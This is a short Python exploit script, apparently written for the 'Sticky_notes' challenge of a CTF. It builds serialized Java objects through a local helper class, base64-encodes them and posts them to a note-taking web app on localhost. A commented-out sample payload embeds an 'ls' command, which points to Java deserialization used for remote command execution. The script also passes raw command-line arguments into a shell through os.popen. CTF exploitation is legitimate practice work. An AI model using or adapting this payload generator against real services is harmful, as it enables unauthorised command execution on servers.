import requests
import base64
import os
import sys

TARGET_URL = 'http://localhost:8082'

def add_note(note):
    data = {
        "note":note
    }
    res = requests.post(f"{TARGET_URL}/add",data=data,allow_redirects=False)
    print(res.headers)
    print(res.text)

def generatePayload(command,text):
    origWD = os.getcwd()
    os.chdir(os.path.join(os.path.abspath(sys.path[0]), '/home/navy356/CTFs/inctf22/handout/handout/Sticky_notes/deployment/BOOT-INF/classes'))
    payload = os.popen(f'java com.example.demo.Main {command} {text} |base64|tr -d "\n"').read()
    os.chdir(origWD)
    print(payload)

#payload = base64.b64decode('rO0ABXNyABxjb20uZXhhbXBsZS5kZW1vLlN0aWNreV9ub3RlfN8pR3BZSqQCAANJAAJpZEwABGRhdGF0ABxMY29tL2V4YW1wbGUvZGVtby9FdmFsX3V0aWw7TAAFbm90ZXN0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAAAAFzcgAaY29tLmV4YW1wbGUuZGVtby5FdmFsX3V0aWyMKPICwK1BvwIAAUwAA3ZhbHEAfgACeHB0AAJsc3QACHRlc3RuYXZ5')
#add_note(payload)
generatePayload(sys.argv[1],sys.argv[2])